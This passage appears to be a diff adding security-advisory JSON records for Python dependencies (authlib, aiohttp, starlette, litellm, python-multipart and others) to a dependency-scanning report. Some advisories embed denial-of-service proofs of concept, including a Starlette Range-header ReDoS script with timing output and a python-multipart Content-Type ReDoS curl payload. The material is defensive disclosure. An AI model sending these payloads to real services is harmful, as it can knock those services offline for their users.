+        "summary": "**Summary**\nAuthlib’s JOSE implementation accepts unbounded JWS/JWT header and signature segments. A remote attacker can craft a token whose base64url‑encoded header or signature spans hundreds of megabytes. During verification, Authlib decodes and parses the full input before it is rejected, driving CPU and memory consumption to hostile levels and enabling denial of service.\n\n**Impact**\n\n- Attack vector: unauthenticated network attacker submits a malicious JWS/JWT.\n\n- Effect: base64 decode + JSON/crypto processing of huge buffers pegs CPU and allocates large amounts of RAM; a single request can exhaust service capacity.\n\n- Observed behaviour: on a test host, the legacy code verified a 500 MB header, consuming ~4 GB RSS and ~9 s CPU before failing.\n\n- Severity: High. CVSS v3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (7.5).\n\nAffected Versions\nAuthlib ≤ 1.6.3 (and earlier) when verifying JWS/JWT tokens. Later snapshots with 256 KB header/signature limits are not affected.\n\n**Proof of concept**\n\nLocal demo (do not run against third-party systems):\nDownload [jws_segment_dos_demo.py](https://github.com/user-attachments/files/22450820/jws_segment_dos_demo.py) the PoC in direcotry authlib/\nRun following Command\n```\npython3 jws_segment_dos_demo.py --variant both --sizes \"500MB\" --fork-per-case\n\n```\nEnvironment: Python 3.13.6, Authlib 1.6.4, Linux x86_64, CPUs=8 \nSample output: Refined\n<img width=\"1295\" height=\"306\" alt=\"image\" src=\"https://github.com/user-attachments/assets/6dd8410f-bc36-4717-8cee-649bac9bf291\" />\n\n\n\n\nThe compilation script prints separate “[ATTACKER]” (token construction) and “[SERVER]” (Authlib verification) RSS deltas so defenders can distinguish client-side preparation from server-side amplification. Regression tests authlib/tests/dos/test_jose_dos.py further capture the issue; the saved original_util.py/original_jws.py reproductions still accept the malicious payload.\n\n**Remediation**\n\n- Apply the upstream patch that introduces decoded size limits:\n\n- MAX_HEADER_SEGMENT_BYTES = 256 KB\n\n- MAX_SIGNATURE_SEGMENT_BYTES = 256 KB\n\n- Enforce Limits in authlib/jose/util.extract_segment and _extract_signature.\n\n- Deploy the patched release immediately.\n\n- For additional defence in depth, reject JWS/JWT inputs above a few kilobytes at the proxy or WAF layer, and rate-limit verification endpoints.\n\n**Workarounds (temporary)**\n\n- Enforce input size limits before handing tokens to Authlib.\n\n- Use application-level throttling to reduce amplification risk.\n\n**Resources**\n\n- Demo script: jws_segment_dos_demo.py\n\n- Tests: authlib/tests/dos/test_jose_dos.py\n\n- OWASP JWT Cheat Sheet (DoS guidance)",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:07.352723Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "authlib"
+        ],
+        "affected_ranges": [
+          "0..1.6.5",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/authlib/authlib/security/advisories/GHSA-pq5p-34cr-23v9",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-61920",
+          "https://github.com/authlib/authlib/commit/867e3f87b072347a1ae9cf6983cc8bbf88447e5e",
+          "https://github.com/authlib/authlib",
+          "https://lists.debian.org/debian-lts-announce/2025/10/msg00032.html",
+          "https://pypi.org/project/authlib",
+          "https://github.com/advisories/GHSA-pq5p-34cr-23v9"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'authlib' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1098",
+        "source": "osv",
+        "title": "aiohttp vulnerable to Denial of Service when trying to parse malformed POST requests",
+        "summary": "### Summary\nAn attacker can send a specially crafted POST (multipart/form-data) request. When the aiohttp server processes it, the server will enter an infinite loop and be unable to process any further requests.\n\n### Impact\nAn attacker can stop the application from serving requests after sending a single request.\n\n-------\n\nFor anyone needing to patch older versions of aiohttp, the minimum diff needed to resolve the issue is (located in `_read_chunk_from_length()`):\n\n```diff\ndiff --git a/aiohttp/multipart.py b/aiohttp/multipart.py\nindex 227be605c..71fc2654a 100644\n--- a/aiohttp/multipart.py\n+++ b/aiohttp/multipart.py\n@@ -338,6 +338,8 @@ class BodyPartReader:\n         assert self._length is not None, \"Content-Length required for chunked read\"\n         chunk_size = min(size, self._length - self._read_bytes)\n         chunk = await self._content.read(chunk_size)\n+        if self._content.at_eof():\n+            self._at_eof = True\n         return chunk\n \n     async def _read_chunk_from_stream(self, size: int) -> bytes:\n```\n\nThis does however introduce some very minor issues with handling form data. So, if possible, it would be recommended to also backport the changes in:\nhttps://github.com/aio-libs/aiohttp/commit/cebe526b9c34dc3a3da9140409db63014bc4cf19\nhttps://github.com/aio-libs/aiohttp/commit/7eecdff163ccf029fbb1ddc9de4169d4aaeb6597\nhttps://github.com/aio-libs/aiohttp/commit/f21c6f2ca512a026ce7f0f6c6311f62d6a638866",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T11:45:40.794194Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "aiohttp"
+        ],
+        "affected_ranges": [
+          "0..3.9.4",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5m98-qgg9-wh84",
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-30251",
+          "https://github.com/aio-libs/aiohttp/commit/7eecdff163ccf029fbb1ddc9de4169d4aaeb6597",
+          "https://github.com/aio-libs/aiohttp/commit/cebe526b9c34dc3a3da9140409db63014bc4cf19",
+          "https://github.com/aio-libs/aiohttp/commit/f21c6f2ca512a026ce7f0f6c6311f62d6a638866",
+          "https://github.com/aio-libs/aiohttp",
+          "https://lists.debian.org/debian-lts-announce/2025/02/msg00002.html",
+          "http://www.openwall.com/lists/oss-security/2024/05/02/4",
+          "https://pypi.org/project/aiohttp",
+          "https://github.com/advisories/GHSA-5m98-qgg9-wh84"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'aiohttp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1103",
+        "source": "osv",
+        "title": "aiohttp allows request smuggling due to incorrect parsing of chunk extensions",
+        "summary": "### Summary\nThe Python parser parses newlines in chunk extensions incorrectly which can lead to request smuggling vulnerabilities under certain conditions.\n\n### Impact\nIf a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or `AIOHTTP_NO_EXTENSIONS` is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.\n\n-----\n\nPatch: https://github.com/aio-libs/aiohttp/commit/259edc369075de63e6f3a4eaade058c62af0df71",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:45.226773Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "aiohttp"
+        ],
+        "affected_ranges": [
+          "0..3.10.11",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-8495-4g3g-x7pr",
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-52304",
+          "https://github.com/aio-libs/aiohttp/commit/259edc369075de63e6f3a4eaade058c62af0df71",
+          "https://github.com/aio-libs/aiohttp",
+          "https://lists.debian.org/debian-lts-announce/2025/02/msg00002.html",
+          "https://pypi.org/project/aiohttp",
+          "https://github.com/advisories/GHSA-8495-4g3g-x7pr"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'aiohttp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1508",
+        "source": "osv",
+        "title": "Langchain Server-Side Request Forgery vulnerability",
+        "summary": "In Langchain before 0.0.329, prompt injection allows an attacker to force the service to retrieve data from an arbitrary URL, essentially providing SSRF and potentially injecting content into downstream tasks.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T11:45:26.029662Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "langchain"
+        ],
+        "affected_ranges": [
+          "0..0.0.329",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2023-32786",
+          "https://github.com/langchain-ai/langchain/pull/12747",
+          "https://gist.github.com/rharang/d265f46fc3161b31ac2e81db44d662e1",
+          "https://github.com/langchain-ai/langchain",
+          "https://github.com/langchain-ai/langchain/releases/tag/v0.0.329",
+          "https://pypi.org/project/langchain",
+          "https://github.com/advisories/GHSA-6h8p-4hx9-w66c"
+        ]
+      },
+      "repo": "ianlintner/audio_engineer",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'langchain' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1096",
+        "source": "osv",
+        "title": "aiohttp has a memory leak when middleware is enabled when requesting a resource with a non-allowed method",
+        "summary": "### Summary\n\nA memory leak can occur when a request produces a `MatchInfoError`. This was caused by adding an entry to a cache on each request, due to the building of each `MatchInfoError` producing a unique cache entry.\n\n### Impact\n\nIf the user is making use of any middlewares with `aiohttp.web` then it is advisable to upgrade immediately.\n\nAn attacker may be able to exhaust the memory resources of a server by sending a substantial number (100,000s to millions) of such requests.\n\n-----\n\nPatch: https://github.com/aio-libs/aiohttp/commit/bc15db61615079d1b6327ba42c682f758fa96936",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:45.010533Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "aiohttp"
+        ],
+        "affected_ranges": [
+          "0..3.10.11",
+          "3.10.6..∞"
+        ],
+        "references": [
+          "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-27mf-ghqm-j3j8",
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-52303",
+          "https://github.com/aio-libs/aiohttp/commit/bc15db61615079d1b6327ba42c682f758fa96936",
+          "https://github.com/aio-libs/aiohttp",
+          "https://pypi.org/project/aiohttp",
+          "https://github.com/advisories/GHSA-27mf-ghqm-j3j8"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'aiohttp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1541",
+        "source": "osv",
+        "title": "LiteLLM Vulnerable to Remote Code Execution (RCE)",
+        "summary": "BerriAI/litellm version 1.40.12 contains a vulnerability that allows remote code execution. The issue exists in the handling of the 'post_call_rules' configuration, where a callback function can be added. The provided value is split at the final '.' mark, with the last part considered the function name and the remaining part appended with the '.py' extension and imported. This allows an attacker to set a system method, such as 'os.system', as a callback, enabling the execution of arbitrary commands when a chat response is processed.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:54.867610Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "litellm"
+        ],
+        "affected_ranges": [
+          "1.40.3.dev2..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-6825",
+          "https://github.com/berriai/litellm/commit/441c7275ed2715f47650a7c2e525055c804073a9",
+          "https://github.com/BerriAI/litellm",
+          "https://github.com/BerriAI/litellm/blob/056913fd7049923a106130b02d7c29e7f312beec/litellm/utils.py#L2818",
+          "https://huntr.com/bounties/1d98bebb-6cf4-46c9-87c3-d3b1972973b5",
+          "https://pypi.org/project/litellm",
+          "https://github.com/advisories/GHSA-53gh-p8jc-7rg8"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'litellm' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1101",
+        "source": "osv",
+        "title": "AIOHTTP's HTTP Parser auto_decompress feature is vulnerable to zip bomb",
+        "summary": "### Summary\nA zip bomb can be used to execute a DoS against the aiohttp server.\n\n### Impact\nAn attacker may be able to send a compressed request that when decompressed by aiohttp could exhaust the host's memory.\n\n------\n\nPatch: https://github.com/aio-libs/aiohttp/commit/2b920c39002cee0ec5b402581779bbaaf7c9138a",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:14.921646Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "aiohttp"
+        ],
+        "affected_ranges": [
+          "0..3.13.3",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-6mq8-rvhq-8wgg",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-69223",
+          "https://github.com/aio-libs/aiohttp/commit/2b920c39002cee0ec5b402581779bbaaf7c9138a",
+          "https://github.com/aio-libs/aiohttp",
+          "https://pypi.org/project/aiohttp",
+          "https://github.com/advisories/GHSA-6mq8-rvhq-8wgg"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'aiohttp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1545",
+        "source": "osv",
+        "title": "LiteLLM Vulnerable to Denial of Service (DoS) via Crafted HTTP Request",
+        "summary": "A Denial of Service (DoS) vulnerability exists in berriai/litellm version v1.44.5. This vulnerability can be exploited by appending characters, such as dashes (-), to the end of a multipart boundary in an HTTP request. The server continuously processes each character, leading to excessive resource consumption and rendering the service unavailable. The issue is unauthenticated and does not require any user interaction, impacting all users of the service.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:57.277763Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "litellm"
+        ],
+        "affected_ranges": [
+          "0..1.56.2",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-8984",
+          "https://github.com/BerriAI/litellm/commit/4f49f836aa844ac9b6bfbeff27e6f6b2b9cf3f61",
+          "https://github.com/BerriAI/litellm",
+          "https://github.com/BerriAI/litellm/blob/8c5ff150f6142608ffe968e4e68429f978fda187/litellm/tests/test_spend_logs.py#L242",
+          "https://huntr.com/bounties/554fc76b-3097-4223-b4cf-110b853e9355",
+          "https://pypi.org/project/litellm",
+          "https://github.com/advisories/GHSA-fh2c-86xm-pm2x"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'litellm' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1942",
+        "source": "osv",
+        "title": "Starlette vulnerable to O(n^2) DoS via Range header merging in ``starlette.responses.FileResponse``",
+        "summary": "### Summary\nAn unauthenticated attacker can send a crafted HTTP Range header that triggers quadratic-time processing in Starlette's `FileResponse` Range parsing/merging logic. This enables CPU exhaustion per request, causing denial‑of‑service for endpoints serving files (e.g., `StaticFiles` or any use of `FileResponse`).\n\n### Details\nStarlette parses multi-range requests in ``FileResponse._parse_range_header()``, then merges ranges using an O(n^2) algorithm.\n\n```python\n# starlette/responses.py\n_RANGE_PATTERN = re.compile(r\"(\\d*)-(\\d*)\") # vulnerable to O(n^2) complexity ReDoS\n\nclass FileResponse(Response):\n    @staticmethod\n    def _parse_range_header(http_range: str, file_size: int) -> list[tuple[int, int]]:\n        ranges: list[tuple[int, int]] = []\n        try:\n            units, range_ = http_range.split(\"=\", 1)\n        except ValueError:\n            raise MalformedRangeHeader()\n\n        # [...]\n\n        ranges = [\n            (\n                int(_[0]) if _[0] else file_size - int(_[1]),\n                int(_[1]) + 1 if _[0] and _[1] and int(_[1]) < file_size else file_size,\n            )\n            for _ in _RANGE_PATTERN.findall(range_) # vulnerable\n            if _ != (\"\", \"\")\n        ]\n\n```\n\nThe parsing loop of ``FileResponse._parse_range_header()`` uses the regular expression which vulnerable to denial of service for its O(n^2) complexity. A crafted `Range` header can maximize its complexity.\n\nThe merge loop processes each input range by scanning the entire result list, yielding quadratic behavior with many disjoint ranges. A crafted Range header with many small, non-overlapping ranges (or specially shaped numeric substrings) maximizes comparisons.\n\n  This affects any Starlette application that uses:\n\n  - ``starlette.staticfiles.StaticFiles`` (internally returns `FileResponse`) — `starlette/staticfiles.py:178`\n  - Direct ``starlette.responses.FileResponse`` responses\n\n### PoC\n```python\n#!/usr/bin/env python3\n\nimport sys\nimport time\n\ntry:\n    import starlette\n    from starlette.responses import FileResponse\nexcept Exception as e:\n    print(f\"[ERROR] Failed to import starlette: {e}\")\n    sys.exit(1)\n\n\ndef build_payload(length: int) -> str:\n    \"\"\"Build the Range header value body: '0' * num_zeros + '0-'\"\"\"\n    return (\"0\" * length) + \"a-\"\n\n\ndef test(header: str, file_size: int) -> float:\n    start = time.perf_counter()\n    try:\n        FileResponse._parse_range_header(header, file_size)\n    except Exception:\n        pass\n    end = time.perf_counter()\n    elapsed = end - start\n    return elapsed\n\n\ndef run_once(num_zeros: int) -> None:\n    range_body = build_payload(num_zeros)\n    header = \"bytes=\" + range_body\n    # Use a sufficiently large file_size so upper bounds default to file size\n    file_size = max(len(range_body) + 10, 1_000_000)\n    \n    print(f\"[DEBUG] range_body length: {len(range_body)} bytes\")\n    elapsed_time = test(header, file_size)\n    print(f\"[DEBUG] elapsed time: {elapsed_time:.6f} seconds\\n\")\n\n\nif __name__ == \"__main__\":\n    print(f\"[INFO] Starlette Version: {starlette.__version__}\")\n    for n in [5000, 10000, 20000, 40000]:\n        run_once(n)\n\n\"\"\"\n$ python3 poc_dos_range.py\n[INFO] Starlette Version: 0.48.0\n[DEBUG] range_body length: 5002 bytes\n[DEBUG] elapsed time: 0.053932 seconds\n\n[DEBUG] range_body length: 10002 bytes\n[DEBUG] elapsed time: 0.209770 seconds\n\n[DEBUG] range_body length: 20002 bytes\n[DEBUG] elapsed time: 0.885296 seconds\n\n[DEBUG] range_body length: 40002 bytes\n[DEBUG] elapsed time: 3.238832 seconds\n\"\"\"\n```\n\n### Impact\nAny Starlette app serving files via FileResponse or StaticFiles; frameworks built on Starlette (e.g., FastAPI) are indirectly impacted when using file-serving endpoints. Unauthenticated remote attackers can exploit this via a single HTTP request with a crafted Range header.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:08.430192Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "starlette"
+        ],
+        "affected_ranges": [
+          "0..0.49.1",
+          "0.39.0..∞"
+        ],
+        "references": [
+          "https://github.com/Kludex/starlette/security/advisories/GHSA-7f5h-v6xp-fcq8",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-62727",
+          "https://github.com/Kludex/starlette/commit/4ea6e22b489ec388d6004cfbca52dd5b147127c5",
+          "https://github.com/Kludex/starlette/commit/69ed26a85956ef4bd0161807eb27abf49be7cd3c",
+          "https://github.com/Kludex/starlette",
+          "https://github.com/Kludex/starlette/releases/tag/0.49.1",
+          "https://pypi.org/project/starlette",
+          "https://github.com/advisories/GHSA-7f5h-v6xp-fcq8"
+        ]
+      },
+      "repo": "tiangolo/fastapi",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'starlette' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1548",
+        "source": "osv",
+        "title": "LiteLLM Reveals Portion of API Key via a Logging File",
+        "summary": "In berriai/litellm before version 1.44.12, the `litellm/litellm_core_utils/litellm_logging.py` file contains a vulnerability where the API key masking code only masks the first 5 characters of the key. This results in the leakage of almost the entire API key in the logs, exposing a significant amount of the secret key. The issue affects version v1.44.9.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:57.987531Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "litellm"
+        ],
+        "affected_ranges": [
+          "0..1.44.12",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-9606",
+          "https://github.com/berriai/litellm/commit/9094071c4782183e84f10630e2450be3db55509a",
+          "https://github.com/BerriAI/litellm",
+          "https://huntr.com/bounties/4a03796f-a8d4-4293-84ef-d3959456223a",
+          "https://pypi.org/project/litellm",
+          "https://github.com/advisories/GHSA-g5pg-73fc-hjwq"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'litellm' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1812",
+        "source": "osv",
+        "title": "Pydantic regular expression denial of service",
+        "summary": "Regular expression denial of service in Pydantic < 2.4.0, < 1.10.13 allows remote attackers to cause denial of service via a crafted email string.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T11:45:38.517274Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "pydantic"
+        ],
+        "affected_ranges": [
+          "0..1.10.13",
+          "0..2.4.0",
+          "0..∞",
+          "2.0.0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-3772",
+          "https://github.com/pydantic/pydantic/pull/7360",
+          "https://github.com/pydantic/pydantic/commit/59d8f38fd6220e3917c53785dbc70317d6f8e631",
+          "https://github.com/pydantic/pydantic/commit/e4393ae6145c4dadff739990bb0116c6dec3441b",
+          "https://github.com/pydantic/pydantic",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6JBZLMSH4GAZOVBMT2JUO2LXHY7M2ALI",
+          "https://pypi.org/project/pydantic",
+          "https://github.com/advisories/GHSA-mr82-8j83-vxmv"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'pydantic' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1812",
+        "source": "osv",
+        "title": "Pydantic regular expression denial of service",
+        "summary": "Regular expression denial of service in Pydantic < 2.4.0, < 1.10.13 allows remote attackers to cause denial of service via a crafted email string.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T11:45:38.517274Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "pydantic"
+        ],
+        "affected_ranges": [
+          "0..1.10.13",
+          "0..2.4.0",
+          "0..∞",
+          "2.0.0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-3772",
+          "https://github.com/pydantic/pydantic/pull/7360",
+          "https://github.com/pydantic/pydantic/commit/59d8f38fd6220e3917c53785dbc70317d6f8e631",
+          "https://github.com/pydantic/pydantic/commit/e4393ae6145c4dadff739990bb0116c6dec3441b",
+          "https://github.com/pydantic/pydantic",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6JBZLMSH4GAZOVBMT2JUO2LXHY7M2ALI",
+          "https://pypi.org/project/pydantic",
+          "https://github.com/advisories/GHSA-mr82-8j83-vxmv"
+        ]
+      },
+      "repo": "ianlintner/audio_engineer",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'pydantic' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1812",
+        "source": "osv",
+        "title": "Pydantic regular expression denial of service",
+        "summary": "Regular expression denial of service in Pydantic < 2.4.0, < 1.10.13 allows remote attackers to cause denial of service via a crafted email string.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T11:45:38.517274Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "pydantic"
+        ],
+        "affected_ranges": [
+          "0..1.10.13",
+          "0..2.4.0",
+          "0..∞",
+          "2.0.0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-3772",
+          "https://github.com/pydantic/pydantic/pull/7360",
+          "https://github.com/pydantic/pydantic/commit/59d8f38fd6220e3917c53785dbc70317d6f8e631",
+          "https://github.com/pydantic/pydantic/commit/e4393ae6145c4dadff739990bb0116c6dec3441b",
+          "https://github.com/pydantic/pydantic",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6JBZLMSH4GAZOVBMT2JUO2LXHY7M2ALI",
+          "https://pypi.org/project/pydantic",
+          "https://github.com/advisories/GHSA-mr82-8j83-vxmv"
+        ]
+      },
+      "repo": "tiangolo/fastapi",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'pydantic' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1850",
+        "source": "osv",
+        "title": "python-multipart vulnerable to Content-Type Header ReDoS",
+        "summary": "### Summary\n\nWhen using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.\n\nAn attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.\n\nThis can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n\nThis only applies when the app uses form data, parsed with `python-multipart`.\n\n### Details\n\nA regular HTTP `Content-Type` header could look like:\n\n```\nContent-Type: text/html; charset=utf-8\n```\n\n`python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\n\nA custom option could be made and sent to the server to break it with:\n\n```\nContent-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n```\n\n### PoC\n\nCreate a simple WSGI application, that just parses the `Content-Type`, and run it with `python main.py`:\n\n```Python\n# main.py\nfrom wsgiref.simple_server import make_server\nfrom wsgiref.validate import validator\n\nfrom multipart.multipart import parse_options_header\n\n\ndef simple_app(environ, start_response):\n    _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])\n\n    start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])\n    return [b\"Ok\"]\n\n\nhttpd = make_server(\"\", 8123, validator(simple_app))\nprint(\"Serving on port 8123...\")\nhttpd.serve_forever()\n```\n\nThen send the attacking request with:\n\n```console\n$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/'\n```\n\n### Impact\n\nThis is a ReDoS, (Regular expression Denial of Service), so it only applies to those using python-multipart to read form data, such as Starlette and FastAPI.\n\n### Original Report\n\nThis was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r\n\n<details>\n<summary>Original report to FastAPI</summary>\n\nHey Tiangolo!\n\nMy name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).\n\nHere are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:\n\n```Python\nfrom typing import Annotated\nfrom fastapi.responses import HTMLResponse\nfrom fastapi import FastAPI,Form\nfrom pydantic import BaseModel\n\nclass Item(BaseModel):\n    username: str\n\napp = FastAPI()\n\n@app.get(\"/\", response_class=HTMLResponse)\nasync def index():\n    return HTMLResponse(\"Test\", status_code=200)\n\n@app.post(\"/submit/\")\nasync def submit(username: Annotated[str, Form()]):\n    return {\"username\": username}\n\n@app.post(\"/submit_json/\")\nasync def submit_json(item: Item):\n    return {\"username\": item.username}\n```\n\nI'm running the above with uvicorn with the following command:\n\n```console\nuvicorn server:app\n```\n\nThen run the following cUrl command:\n\n```\ncurl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; 